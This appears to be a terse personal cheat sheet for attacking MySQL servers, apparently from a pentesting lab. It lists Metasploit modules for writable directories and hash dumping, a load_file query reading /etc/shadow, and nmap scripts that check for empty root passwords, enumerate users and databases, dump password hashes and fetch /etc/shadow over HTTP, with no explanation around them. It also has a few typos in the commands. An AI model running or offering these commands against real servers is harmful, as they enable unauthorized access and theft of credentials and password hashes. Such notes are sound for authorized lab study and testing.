mysl -h ip -u root 
in msfconsole do:# search mysql
msfconsole
scanner/mysql/mysql/mysql_writable_dirs
scanner/mysql/mysql_hashdump


mysql command to get file :
select load_file("/etc/shadow");

get empty passwords
sudo nmap -p 3306 192.26.238.3 --script mysql-empty-password --script-args='username=root,password='

get certain files in target example /etc/shadow

nmap --script http-passwd --script-args http-passwd.root=/etc/shadow <target>

nmap scripts
--script=mysql-empty-password

--script=mysql-info

--script mysql-users  --script-args="mysqluser='root' ,mysqlpass='' "

--script mysql-databases  --script-args="mysqluser='root' ,mysqlpass='' "

--script=mysql-empty-variables --script-args="mysqluser='root' ,mysqlpass='' "

--script=mysql-audit --script-args="mysql-audit.username='root' ,mysql-audit.password='' , mysql.audit.filename='/usr/nmap/nselib/data/mysql-cis.audit'"

--script=mysql-empty-dump-hashes --script-args="username='root' ,password='' "

--script=mysql-query --script-args="query='select count(*) from books.authors;', username='root' ,password='' "


some wordlists for directories for msfconsole mysql

/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
/usr/share/metasploit-framework/data/wordlists/directory.txt